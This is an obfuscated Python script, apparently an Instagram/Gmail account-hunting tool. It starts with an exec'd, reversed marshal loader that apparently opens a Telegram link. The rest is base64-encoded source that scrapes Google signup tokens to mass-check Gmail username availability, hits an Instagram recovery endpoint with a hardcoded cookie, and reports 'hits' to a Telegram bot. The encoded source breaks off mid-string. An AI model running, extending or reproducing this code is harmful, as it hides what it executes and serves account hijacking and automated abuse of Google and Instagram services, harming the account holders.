
_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(b'\x00\x00\x00\x06r\x03V\x01\x00\x00\xf0\x03V\x01\x00\x00\xf0\x03V\x01\x00\x00\xf0\x03V\x01\x00\x00\xf4\x03V\x01\x00\x00\xf1\x03U\x07\x00\x00\xf0\x05\x80\x05\x00\xd81\x00\xd01\x00\xd41\x00\xd10\x10\xd0\x0f\x84\n\x80\x0f\x00\xd8\x11\x00\xd0\x11\x00\xd0\x11\x00\xd0\x11\x00\xd8\x01\x01\x01\x03\xf0\x00\x00\x00Ms\x00\x00\x00\x01\x00\x00\x00\x08r>eludom<\x08\xfa>x<\x03\xfa\x00\x00\x00\x00\xf3\x00\xa9tnirp\x05\xdanepo\x04\xdaresworbbew\n\xda\x03)\x8b\x90\x9d\xf0\x84\x90\x9d\xf0\x8d\x90\x9d\xf0\x80\x90\x9d\xf0\x87\x90\x9d\xf0\x87\x90\x9d\xf0\x82\x90\x9d\xf0 \x98\x90\x9d\xf0\x8c\x90\x9d\xf0 \x8e\x90\x9d\xf0\x93\x90\x9d\xf0 \x93\x90\x9d\xf0\x92\x90\x9d\xf0\x94\x90\x9d\xf0\x90\x90\x9d\xf0\x84\x90\x9d\xf0\x91\x90\x9d\xf0 \x83\x90\x9d\xf0\x8d\x90\x9d\xf0\x84\x90\x9d\xf0\x92\x90\x9d\xf0 \x8d\x90\x9d\xf0\x84\x90\x9d\xf0\x87\x90\x9d\xf0\x93\x90\x9d\xf0 \x8b\x90\x9d\xf0\x8e\x90\x9d\xf0\x8e\x90\x9d\xf0\x93\x90\x9d\xf0 \x84\x90\x9d\xf0\x87\x90\x9d\xf0\x93\x90\x9d\xf0 \x92\x90\x9d\xf0\x92\x90\x9d\xf0\x84\x90\x9d\xf0\x82\x90\x9d\xf0\x80\x90\x9d\xf0 \x8e\x90\x9d\xf0\x93\x90\x9d\xf0 \x93\x90\x9d\xf0\x8d\x90\x9d\xf0\x80\x90\x9d\xf0\x96\x90\x9d\xf0 \x94\x90\x9d\xf0\x8e\x90\x9d\xf0\x98\x90\x9d\xf0 \x85\x90\x9d\xf0\x88\x90\x9d\xf0\x00\x00\x00\xccu9MmYmZtPuvnx__ij+/em.t//:sptth\x1ezN\x00\x00\x00\x00\xe9\x04)\x00S\x01d\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x03d\x02e\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x02d\x00\x00\x00\x00\x00\x00\x00\x00\x01j\x00e\x00\x02\x00Z\x00l\x01d\x00d\x00\x97\x00\x00\x00D\xf3\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c'))
import os
from base64 import b64decode

file_name = '.encrypted'
source = b64decode(b'aW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHR0eQppbXBvcnQgdGVybWlvcwoKQ09SUkVDVF9QQVNTV09SRCA9ICJQUkoiCgpkZWYgZ2V0X2NvbG9yZWRfaW5wdXQocHJvbXB0LCBjb3JyZWN0KToKICAgIHByaW50KHByb21wdCwgZW5kPSIiLCBmbHVzaD1UcnVlKQogICAgaW5wdXRfY2hhcnMgPSBbXQogICAgCiAgICB3aGlsZSBUcnVlOgogICAgICAgIGZkID0gc3lzLnN0ZGluLmZpbGVubygpCiAgICAgICAgb2xkX3NldHRpbmdzID0gdGVybWlvcy50Y2dldGF0dHIoZmQpCiAgICAgICAgdHJ5OgogICAgICAgICAgICB0dHkuc2V0cmF3KHN5cy5zdGRpbi5maWxlbm8oKSkKICAgICAgICAgICAgY2ggPSBzeXMuc3RkaW4ucmVhZCgxKQogICAgICAgIGZpbmFsbHk6CiAgICAgICAgICAgIHRlcm1pb3MudGNzZXRhdHRyKGZkLCB0ZXJtaW9zLlRDU0FEUkFJTiwgb2xkX3NldHRpbmdzKQoKICAgICAgICBpZiBjaCA9PSAiXG4iIG9yIGNoID09ICJcciI6CiAgICAgICAgICAgIHByaW50KCkgICMgTmV3bGluZSBhZnRlciBFbnRlcgogICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgY2ggPT0gIlx4N2YiOiAgIyBCYWNrc3BhY2UKICAgICAgICAgICAgaWYgaW5wdXRfY2hhcnM6CiAgICAgICAgICAgICAgICBpbnB1dF9jaGFycy5wb3AoKQogICAgICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgiXGIgXGIiICogbGVuKGNvcnJlY3QpKSAgIyBDbGVhciBsaW5lCiAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCJcciIgKyBwcm9tcHQpCiAgICAgICAgICAgICAgICBmb3IgaSwgYyBpbiBlbnVtZXJhdGUoaW5wdXRfY2hhcnMpOgogICAgICAgICAgICAgICAgICAgIGNvbG9yID0gIlwwMzNbMzJtIiBpZiBpIDwgbGVuKGNvcnJlY3QpIGFuZCBjID09IGNvcnJlY3RbaV0gZWxzZSAiXDAzM1szMW0iCiAgICAgICAgICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShjb2xvciArIGMgKyAiXDAzM1swbSIpCiAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBpbnB1dF9jaGFycy5hcHBlbmQoY2gpCiAgICAgICAgICAgIGkgPSBsZW4oaW5wdXRfY2hhcnMpIC0gMQogICAgICAgICAgICBjb2xvciA9ICJcMDMzWzMybSIgaWYgaSA8IGxlbihjb3JyZWN0KSBhbmQgY2ggPT0gY29ycmVjdFtpXSBlbHNlICJcMDMzWzMxbSIKICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShjb2xvciArIGNoICsgIlwwMzNbMG0iKQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgIAogICAgcmV0dXJuICIiLmpvaW4oaW5wdXRfY2hhcnMpCgojIENsZWFyIHNjcmVlbgpvcy5zeXN0ZW0oImNsZWFyIikKcGFzc3dvcmQgPSBnZXRfY29sb3JlZF9pbnB1dCgiXDAzM1sxOzM2bUVudGVyIFBhc3N3b3JkOiBcMDMzWzBtIiwgQ09SUkVDVF9QQVNTV09SRCkKCmlmIHBhc3N3b3JkID09IENPUlJFQ1RfUEFTU1dPUkQ6CiAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgIHByaW50KCJcMDMzWzE7MzJtQWNjZXNzIEdyYW50ZWQuIFJ1bm5pbmcgc2NyaXB0Li4uXDAzM1swbSIpCiAgICAjID09PSBZb3VyIHNjcmlwdCBzdGFydHMgaGVyZSA9PT0KICAgIHByaW50KCJXZWxjb21lIHRvIHRoZSBzeXN0ZW0sIFByYXZlZW4hIikKZWxzZToKICAgIHByaW50KCJcMDMzWzE7MzFtSW5jb3JyZWN0IFBhc3N3b3JkLiBBY2Nlc3MgRGVuaWVkLlwwMzNbMG0iKQogICAgZXhpdCgpCmltcG9ydCB0aW1lCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCByZQppbXBvcnQganNvbgppbXBvcnQgc3RyaW5nCmltcG9ydCByYW5kb20KaW1wb3J0IGhhc2hsaWIKaW1wb3J0IHV1aWQKaW1wb3J0IHRpbWUKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKZnJvbSB0aHJlYWRpbmcgaW1wb3J0IFRocmVhZAppbXBvcnQgcmVxdWVzdHMKZnJvbSByZXF1ZXN0cyBpbXBvcnQgcG9zdCBhcyBwcApmcm9tIHVzZXJfYWdlbnQgaW1wb3J0IGdlbmVyYXRlX3VzZXJfYWdlbnQKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSwgcmFuZHJhbmdlCmZyb20gY2ZvbnRzIGltcG9ydCByZW5kZXIsIHNheQpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdAppbXBvcnQgd2ViYnJvd3NlcgppbXBvcnQgZGF0ZXRpbWUKaW1wb3J0IGRhdGV0aW1lCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3lzCmZyb20gcmljaC5jb25zb2xlIGltcG9ydCBDb25zb2xlCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwKCmNvbnNvbGUgPSBDb25zb2xlKCkKaW5pdChhdXRvcmVzZXQ9VHJ1ZSkKCklOU1RBR1JBTV9SRUNPVkVSWV9VUkwgPSAnaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL2FjY291bnRzL3NlbmRfcmVjb3ZlcnlfZmxvd19lbWFpbC8nCklHX1NJR19LRVlfVkVSU0lPTiA9ICdpZ19zaWdfa2V5X3ZlcnNpb24nClNJR05FRF9CT0RZID0gJ3NpZ25lZF9ib2R5JwpDT09LSUVfVkFMVUUgPSAnbWlkPVpWZkd2Z0FCQUFHb1FxYTdBWTNtZ29ZQlYxblA7IGNzcmZ0b2tlbj05eTNONWtMcXppYWxRQTd6OTZBTWl5QUtMTUJXcHFWaicKQ09OVEVOVF9UWVBFX0hFQURFUiA9ICdDb250ZW50LVR5cGUnCkNPT0tJRV9IRUFERVIgPSAnQ29va2llJwpVU0VSX0FHRU5UX0hFQURFUiA9ICdVc2VyLUFnZW50JwpERUZBVUxUX1VTRVJfQUdFTlQgPSAoJ01vemlsbGEvNS4wIChNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NCkgJwogICAgICAgICAgICAgICAgICAgICAgJ0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pICcKICAgICAgICAgICAgICAgICAgICAgICdDaHJvbWUvMTIyLjAuMC4wIFNhZmFyaS81MzcuMzYnKQoKR09PR0xFX0FDQ09VTlRTX1VSTCA9ICdodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20nCkdPT0dMRV9BQ0NPVU5UU19ET01BSU4gPSAnYWNjb3VudHMuZ29vZ2xlLmNvbScKUkVGRVJSRVJfSEVBREVSID0gJ3JlZmVyZXInCk9SSUdJTl9IRUFERVIgPSAnb3JpZ2luJwpBVVRIT1JJVFlfSEVBREVSID0gJ2F1dGhvcml0eScKQ09OVEVOVF9UWVBFX0ZPUk0gPSAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04JwpDT05URU5UX1RZUEVfRk9STV9BTFQgPSAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkO2NoYXJzZXQ9VVRGLTgnCgpUT0tFTl9GSUxFID0gJ3RsLnR4dCcKZWl6b25fZG9tYWluID0gJ0BnbWFpbC5jb20nCgpQID0gJ1x4MWJbMTs5N20nCkIgPSAnXHgxYlsxOzk0bScKTyA9ICdceDFiWzE7OTZtJwpaID0gJ1x4MWJbMTszMG0nClggPSAnXHgxYlsxOzMzbScKRiA9ICdceDFiWzI7MzJtJwpaID0gJ1x4MWJbMTszMW0nCkwgPSAnXHgxYlsxOzk1bScKQyA9ICdceDFiWzI7MzVtJwpBID0gJ1x4MWJbMjszOW0nClAgPSAnXHgxYlszODs1OzIzMW0nCkogPSAnXHgxYlszODs1OzIwOG0nCkoxID0gJ1x4MWJbMzg7NTsyMDJtJwpKMiA9ICdceDFiWzM4OzU7MjAzbScKSjIxID0gJ1x4MWJbMzg7NTsyMDRtJwpKMjIgPSAnXHgxYlszODs1OzIwOW0nCkYxID0gJ1x4MWJbMzg7NTs3Nm0nCkMxID0gJ1x4MWJbMzg7NTsxMjBtJwpQMSA9ICdceDFiWzM4OzU7MTUwbScKUDIgPSAnXHgxYlszODs1OzE5MG0nCkUgPSAnXDAzM1sxOzMxbScKWSA9ICdcMDMzWzE7MzNtJwpaID0gJ1wwMzNbMTszMW0nClggPSAnXDAzM1sxOzMzbScKWjEgPSAnXDAzM1syOzMxbScKRiA9ICdcMDMzWzI7MzJtJwpBID0gJ1wwMzNbMjszNG0nCkMgPSAnXDAzM1syOzM1bScKUyA9ICdcMDMzWzI7MzZtJwpHID0gJ1wwMzNbMTszNG0nCk0gPSAnXHgxYlsxOzM3bScKQiA9ICdceDFiWzE7MzdtJwoKdG90YWxfaGl0cyA9IDAKaGl0cyA9IDAKYmFkX2luc3RhID0gMApiYWRfZW1haWwgPSAwCmdvb2RfaWcgPSAwCmluZm9pbnN0YSA9IHt9CgpiYW5uZXIgPSByZW5kZXIoJ3tSQU5ET019JywgY29sb3JzPVsncmVkJywgJ3llbGxvdyddLCBhbGlnbj0nY2VudGVyJykKcHJpbnQoZicnJwpcMDMzWzE7Mzdt4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXCuKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgXDAzM1sxOzM2bXtiYW5uZXIuY2VudGVyKDUyKX1cMDMzWzE7MzdtICAgIOKVkQrilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWjCuKVkSAgICAgICAgICAgICAgIFwwMzNbMTszNG3htJjKgOG0gOG0oOG0h+G0h8m0IOG0j8m0IOG0m+G0j+G0mCDigJQgc8qPc+G0m+G0h+G0jSDKn+G0gOG0nMm04bSEypwgICAgICAgICAgICAgICBcMDMzWzE7Mzdt4pWRCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQonJycpCgoKSUQgPSBpbnB1dCgi4bSHybThtJvhtIfKgCDKj+G0j+G0nMqAIMmq4bSFIDoiKQpwcmludCgiXDAzM1sxOzM0beKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSIpClRPS0VOID0gaW5wdXQoIuG0h8m04bSb4bSHyoAgypnhtI/htJsg4bSb4bSP4bSL4bSHybQgOiAiKQpvcy5zeXN0ZW0oJ2NsZWFyJykKdHJ5OgogICAgcmVxdWVzdHMucG9zdChmIiIiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT0tFTn0vc2VuZHZpZGVvP2NoYXRfaWQ9e0lEfSZwYXJzZV9tb2RlPU1hcmtkb3duJnZpZGVvPWh0dHBzOi8vdC5tZS9IRlI3TS8xMi82JmNhcHRpb249IC0gQnkgOiBb2YXZhtin2YEg2KfZhNiz2YjYsdmKXSh0Lm1lL0IyNXVyeCkiIiIpCmV4Y2VwdCBFeGNlcHRpb246CiAgICBwYXNzCgoKZGVmIHVwZGF0ZV9zdGF0cygpOgogICAgCiAgICBzeXNkb250d3JpdGUgPSBmIiIiCgp7SjIxfQrila3ilIHilIHilIHila7ila3ilIHilIHilIHila7ila3ilIHila7ilbHila3ila7ila3ilIHilIHilIHila7ila3ilIHilIHilIHila7ila3ilIHila7ila3ilIHila4K4pSD4pWt4pSB4pWu4pSD4pSD4pWt4pSB4pWu4pSD4pSD4pSD4pWw4pWu4pSD4pSD4pWw4pWu4pWt4pWu4pSD4pSD4pWt4pSB4pWu4pSD4pSD4pSD4pWw4pWv4pSD4pSDCuKUg+KVsOKUgeKVr+KUg+KUg+KUg+KVseKUg+KUg+KUg+KVreKVruKVsOKVr+KUg+KVseKUg+KUg+KUg+KUg+KUg+KUg+KVseKUg+KUg+KUg+KVreKVruKVreKVruKUgwrilIPila3ila7ila3ila/ilIPilbDilIHila/ilIPilIPilIPilbDila7ilIPilIPilbHilIPilIPilIPilIPilIPilIPilbHilIPilIPilIPilIPilIPilIPilIPilIMK4pSD4pSD4pSD4pWw4pWu4pSD4pWt4pSB4pWu4pSD4pSD4pSD4pWx4pSD4pSD4pSD4pWt4pWv4pWw4pWv4pSD4pSD4pWw4pSB4pWv4pSD4pSD4pSD4pSD4pSD4pSD4pSDCuKVsOKVr+KVsOKUgeKVr+KVsOKVr+KVseKVsOKVr+KVsOKVr+KVseKVsOKUgeKVr+KVsOKUgeKUgeKUgeKVr+KVsOKUgeKUgeKUgeKVr+KVsOKVr+KVsOKVr+KVsOKVrwoKe1AxfV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCntQMX1bIDEgXSB7Rn3wnZCT8J2Qq/CdkK7wnZCeICAgOiBbIHtoaXRzfSBdIAp7UDF9WyAyIF0ge1p98J2QhfCdkJrwnZCl8J2QrPCdkJ4gIDogWyB7YmFkX2luc3RhfSBdIAp7UDF9WyAzIF0ge0oyMX3wnZCB8J2QmvCdkJ0gICAgOiBbIHtiYWRfZW1haWx9IF0gCntQMX1bIDQgXSB7Rn3wnZCG8J2QqPCdkKjwnZCdICAgOiBbIHtnb29kX2lnfSBdCntQMX1bIDUgXSDwnZCD8J2QnvCdkK8gfiBA8J2Qj/CdkLLwnZCo8J2Qm/CdkKzwnZCc8J2QrvCdkKvwnZCaCntGfV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCiIiIgogICAgc3lzLnN0ZG91dC53cml0ZSgnXHInICsgc3lzZG9udHdyaXRlKQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCgpkZWYgRWl6b24oKToKICAgIHRyeToKICAgICAgICBhbHBoYWJldCA9ICdhemVydHl1aW9wbWxramhnZmRzcXd4Y3ZibicKICAgICAgICBuMSA9ICcnLmpvaW4oY2hvaWNlKGFscGhhYmV0KSBmb3IgXyBpbiByYW5nZShyYW5kcmFuZ2UoNiwgOSkpKQogICAgICAgIG4yID0gJycuam9pbihjaG9pY2UoYWxwaGFiZXQpIGZvciBfIGluIHJhbmdlKHJhbmRyYW5nZSgzLCA5KSkpCiAgICAgICAgaG9zdCA9ICcnLmpvaW4oY2hvaWNlKGFscGhhYmV0KSBmb3IgXyBpbiByYW5nZShyYW5kcmFuZ2UoMTUsIDMwKSkpCiAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgJ2FjY2VwdCc6ICcqLyonLAogICAgICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2FyLUlRLGFyO3E9MC45LGVuLUlRO3E9MC44LGVuO3E9MC43LGVuLVVTO3E9MC42JywKICAgICAgICAgICAgQ09OVEVOVF9UWVBFX0hFQURFUjogQ09OVEVOVF9UWVBFX0ZPUk1fQUxULAogICAgICAgICAgICAnZ29vZ2xlLWFjY291bnRzLXhzcmYnOiAnMScsCiAgICAgICAgICAgIFVTRVJfQUdFTlRfSEVBREVSOiBzdHIoZ2VuZXJhdGVfdXNlcl9hZ2VudCgpKQogICAgICAgIH0KICAgICAgICByZWNvdmVyeV91cmwgPSAoZiJ7R09PR0xFX0FDQ09VTlRTX1VSTH0vc2lnbmluL3YyL3VzZXJuYW1lcmVjb3ZlcnkiCiAgICAgICAgICAgICAgICAgICAgICAgICI/Zmxvd05hbWU9R2xpZldlYlNpZ25JbiZmbG93RW50cnk9U2VydmljZUxvZ2luJmhsPWVuLUdCIikKICAgICAgICByZXMxID0gcmVxdWVzdHMuZ2V0KHJlY292ZXJ5X3VybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHRvayA9IHJlLnNlYXJjaCgKICAgICAgICAgICAgJ2RhdGEtaW5pdGlhbC1zZXR1cC1kYXRhPSIlLkAubnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsJnF1b3Q7KC4qPykmcXVvdDssbnVsbCxudWxsLG51bGwsJnF1b3Q7KC4qPykmJywKICAgICAgICAgICAgcmVzMS50ZXh0CiAgICAgICAgKS5ncm91cCgyKQogICAgICAgIGNvb2tpZXMgPSB7J19fSG9zdC1HQVBTJzogaG9zdH0KICAgICAgICBoZWFkZXJzMiA9IHsKICAgICAgICAgICAgQVVUSE9SSVRZX0hFQURFUjogR09PR0xFX0FDQ09VTlRTX0RPTUFJTiwKICAgICAgICAgICAgJ2FjY2VwdCc6ICcqLyonLAogICAgICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywKICAgICAgICAgICAgQ09OVEVOVF9UWVBFX0hFQURFUjogQ09OVEVOVF9UWVBFX0ZPUk1fQUxULAogICAgICAgICAgICAnZ29vZ2xlLWFjY291bnRzLXhzcmYnOiAnMScsCiAgICAgICAgICAgIE9SSUdJTl9IRUFERVI6IEdPT0dMRV9BQ0NPVU5UU19VUkwsCiAgICAgICAgICAgIFJFRkVSUkVSX0hFQURFUjogKCdodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20vc2lnbnVwL3YyL2NyZWF0ZWFjY291bnQnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICc/c2VydmljZT1tYWlsJmNvbnRpbnVlPWh0dHBzJTNBJTJGJTJGbWFpbC5nb29nbGUuY29tJTJGbWFpbCUyRnUlMkYwJTJGJnRoZW1lPW1uJyksCiAgICAgICAgICAgIFVTRVJfQUdFTlRfSEVBREVSOiBnZW5lcmF0ZV91c2VyX2FnZW50KCkKICAgICAgICB9CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgJ2YucmVxJzogZidbInt0b2t9Iiwie24xfSIsIntuMn0iLCJ7bjF9Iiwie24yfSIsMCwwLG51bGwsbnVsbCwid2ViLWdsaWYtc2lnbnVwIiwwLG51bGwsMSxbXSwxXScsCiAgICAgICAgICAgICdkZXZpY2VpbmZvJzogKCdbbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLCJOTCIsbnVsbCxudWxsLG51bGwsIkdsaWZXZWJTaWduSW4iLG51bGwsW10sbnVsbCxudWxsLG51bGwsbnVsbCwyLCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgJ251bGwsMCwxLCIiLG51bGwsbnVsbCwyLDJdJykKICAgICAgICB9CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KGYie0dPT0dMRV9BQ0NPVU5UU19VUkx9L18vc2lnbnVwL3ZhbGlkYXRlcGVyc29uYWxkZXRhaWxzIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llcz1jb29raWVzLCBoZWFkZXJzPWhlYWRlcnMyLCBkYXRhPWRhdGEpCiAgICAgICAgdG9rZW5fbGluZSA9IHN0cihyZXNwb25zZS50ZXh0KS5zcGxpdCgnIixudWxsLCInKVsxXS5zcGxpdCgnIicpWzBdCiAgICAgICAgaG9zdCA9IHJlc3BvbnNlLmNvb2tpZXMuZ2V0X2RpY3QoKVsnX19Ib3N0LUdBUFMnXQogICAgICAgIHdpdGggb3BlbihUT0tFTl9GSUxFLCAndycpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZiJ7dG9rZW5fbGluZX0vL3tob3N0fVxuIikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChlKQogICAgICAgIEVpem9uKCkKCkVpem9uKCkKCmRlZiBjaGVja19nbWFpbChlbWFpbCk6CiAgICBnbG9iYWwgYmFkX2VtYWlsLCBoaXRzCiAgICB0cnk6CiAgICAgICAgaWYgJ0AnIGluIGVtYWlsOgogICAgICAgICAgICBlbWFpbCA9IGVtYWlsLnNwbGl0KCdAJylbMF0KICAgICAgICB3aXRoIG9wZW4oVE9LRU5fRklMRSwgJ3InKSBhcyBmOgogICAgICAgICAgICB0b2tlbl9kYXRhID0gZi5yZWFkKCkuc3BsaXRsaW5lcygpWzBdCiAgICAgICAgdGwsIGhvc3QgPSB0b2tlbl9kYXRhLnNwbGl0KCcvLycpCiAgICAgICAgY29va2llcyA9IHsnX19Ib3N0LUdBUFMnOiBob3N0fQogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgIEFVVEhPUklUWV9IRUFERVI6IEdPT0dMRV9BQ0NPVU5UU19ET01BSU4sCiAgICAgICAgICAgICdhY2NlcHQnOiAnKi8qJywKICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsCiAgICAgICAgICAgIENPTlRFTlRfVFlQRV9IRUFERVI6IENPTlRFTlRfVFlQRV9GT1JNX0FMVCwKICAgICAgICAgICAgJ2dvb2dsZS1hY2NvdW50cy14c3JmJzogJzEnLAogICAgICAgICAgICBPUklHSU5fSEVBREVSOiBHT09HTEVfQUNDT1VOVFNfVVJMLAogICAgICAgICAgICBSRUZFUlJFUl9IRUFERVI6IGYiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL3NpZ251cC92Mi9jcmVhdGV1c2VybmFtZT9zZXJ2aWNlPW1haWwmY29udGludWU9aHR0cHMlM0ElMkYlMkZtYWlsLmdvb2dsZS5jb20lMkZtYWlsJTJGdSUyRjAlMkYmVEw9e3RsfSIsCiAgICAgICAgICAgIFVTRVJfQUdFTlRfSEVBREVSOiBnZW5lcmF0ZV91c2VyX2FnZW50KCkKICAgICAgICB9CiAgICAgICAgcGFyYW1zID0geydUTCc6IHRsfQogICAgICAgIGRhdGEgPSAoZiJjb250aW51ZT1odHRwcyUzQSUyRiUyRm1haWwuZ29vZ2xlLmNvbSUyRm1haWwlMkZ1JTJGMCUyRiZkZG09MCZmbG93RW50cnk9U2lnblVwJnNlcnZpY2U9bWFpbCZ0aGVtZT1tbiIgICAgICAgICAgICAgICAgZiImZi5yZXE9JTVCJTIyVEwlM0F7dGx9JTIyJTJDJTIye2VtYWlsfSUyMiUyQzAlMkMwJTJDMSUyQ251bGwlMkMwJTJDNTE2NyU1RCIKICAgICAgICAgICAgICAgICImYXp0PUFGb2FnVVV0Umx2VjkyOG9TOU83RjZlZUk0ZENPMnIxaWclM0ExNzEyMzIyNDYwODg4JmNvb2tpZXNEaXNhYmxlZD1mYWxzZSIKICAgICAgICAgICAgICAgICImZGV2aWNlaW5mbz0lNUJudWxsJTJDbnVsbCUyQ251bGwlMkNudWxsJTJDbnVsbCUyQyUyMk5MJTIyJTJDbnVsbCUyQ251bGwlMkNudWxsJTJDJTIyR2xpZldlYlNpZ25JbiUyMiIKICAgICAgICAgICAgICAgICIlMkNudWxsJTJDJTVCJTVEJTJDbnVsbCUyQ251bGwlMkNudWxsJTJDbnVsbCUyQzIlMkNudWxsJTJDMCUyQzElMkMlMjIlMjIlMkNudWxsJTJDbnVsbCUyQzIlMkMyJTVEIgogICAgICAgICAgICAgICAgIiZnbXNjb3JldmVyc2lvbj11bmRlZmluZWQmZmxvd05hbWU9R2xpZldlYlNpZ25JbiYiKQogICAgICAgIHJlc3BvbnNlID0gcHAoZiJ7R09PR0xFX0FDQ09VTlRTX1VSTH0vXy9zaWdudXAvdXNlcm5hbWVhdmFpbGFiaWxpdHkiLAogICAgICAgICAgICAgICAgICAgICAgcGFyYW1zPXBhcmFtcywgY29va2llcz1jb29raWVzLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSkKICAgICAgICBpZiAnImdmLnVhciIsMScgaW4gcmVzcG9uc2UudGV4dDoKICAgICAgICAgICAgaGl0cyArPSAxCiAgICAgICAgICAgIHVwZGF0ZV9zdGF0cygpCiAgICAgICAgICAgIGZ1bGxfZW1haWwgPSBlbWFpbCArIGVpem9uX2RvbWFpbgogICAgICAgICAgICB1c2VybmFtZSwgZG9tYWluID0gZnVsbF9lbWFpbC5zcGxpdCgnQCcpCiAgICAgICAgICAgIEluZm9BY2ModXNlcm5hbWUsIGRvbWFpbikKICAgICAgICBlbHNlOgogICAgICAgICAgICBiYWRfZW1haWwgKz0gMQogICAgICAgICAgICB1cGRhdGVfc3RhdHMoKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwYXNzCgpkZWYgY2hlY2soZW1haWwpOgogICAgZ2xvYmFsIGdvb2RfaWcsIGJhZF9pbnN0YQogICAgdWEgPSBnZW5lcmF0ZV91c2VyX2FnZW50KCkKICAgIGRldiA9ICd